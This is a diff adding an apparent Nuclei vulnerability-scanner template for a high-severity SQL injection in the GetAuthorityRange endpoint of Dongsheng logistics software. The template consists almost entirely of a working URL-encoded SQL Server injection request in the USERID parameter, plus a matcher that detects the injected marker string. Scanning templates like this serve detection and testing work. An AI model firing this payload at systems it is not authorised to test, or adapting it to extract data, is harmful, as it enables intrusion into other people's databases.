@@ -1,0 +1,30 @@
+id: dongshengsoft-GetAuthorityRange-sqli
+info:
+  name: 东胜物流软件 GetAuthorityRange 存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/60892/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: dongshengsoft,sqli
+
+http:
+  - raw:
+      - |
+        GET /CommMng/BasicDataRef/GetAuthorityRange?modName=-1&USERID=1%27%29%20AND%202619%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%28UNICODE%28SQUARE%28NULL%29%29%20IS%20NULL%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%20aKIF HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'qvjzq1qjbxq')
+        condition: and
